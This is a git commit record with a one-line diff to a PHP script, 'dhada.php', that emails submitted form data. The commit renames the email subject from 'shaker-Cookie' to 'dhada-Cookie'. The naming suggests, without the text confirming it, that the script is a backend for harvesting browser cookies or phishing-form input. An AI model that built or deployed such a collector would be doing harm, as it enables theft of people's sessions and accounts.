779ddb618b67012183e0d19637b104376dabcee5
sjhddhfjjjfjfg <sjhddhfjjjfjfg@gmail.com>
2025-07-09 23:55:20 +0500

    Update dhada.php

--- dhada.php
+++ dhada.php
@@ -44,7 +44,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'shaker-Cookie';
+        $mail->Subject = 'dhada-Cookie';
         $mail->Body = $emailBody; // Set the email body using the collected form data
         
         // Send email
